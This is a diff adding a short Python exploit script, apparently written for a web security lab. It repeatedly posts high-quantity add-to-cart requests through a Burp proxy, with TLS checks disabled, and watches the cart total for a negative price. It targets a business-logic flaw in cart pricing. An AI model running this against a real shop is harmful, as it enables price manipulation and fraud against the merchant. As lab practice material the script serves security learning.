@@ -1,0 +1,65 @@
+import requests
+import sys
+import urllib3
+
+# Disable SSL warnings (since lab uses self-signed sometimes)
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# Proxy to see requests in Burp
+proxies = {
+    "http": "http://127.0.0.1:8080",
+    "https": "http://127.0.0.1:8080"
+}
+
+
+def add_to_cart(url, session_cookie, loops=10, quantity=99):
+    """
+    Sends multiple POST requests to /cart with chosen quantity.
+    """
+    headers = {
+        "Host": url.split("://")[1],
+        "Cookie": f"session={session_cookie}",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": "Mozilla/5.0",
+        "Referer": url + "/product?productId=1"
+    }
+
+    data = {
+        "productId": "1",
+        "redir": "PRODUCT",
+        "quantity": str(quantity)
+    }
+
+    for i in range(loops):
+        print(f"(+) Sending attempt {i + 1} with quantity={quantity}...")
+        r = requests.post(
+            url + "/cart",
+            headers=headers,
+            data=data,
+            verify=False,
+            proxies=proxies
+        )
+        print(f"[*] Status: {r.status_code}")
+        # Optional: print page snippet to check for negative price
+        if "Total" in r.text:
+            start = r.text.find("Total")
+            print(r.text[start:start + 120])  # show around "Total" value
+        print("-" * 50)
+
+
+def main():
+    if len(sys.argv) != 3:
+        print(f"Usage: python {sys.argv[0]} <url> <session_cookie>")
+        print(f"Example: python {sys.argv[0]} https://target.com abc123def456")
+        sys.exit(-1)
+
+    url = sys.argv[1].strip("/")
+    session_cookie = sys.argv[2]
+
+    # Start fuzzing with quantity 99
+    add_to_cart(url, session_cookie, loops=5
+                , quantity=99)
+
+
+if __name__ == "__main__":
+    main()
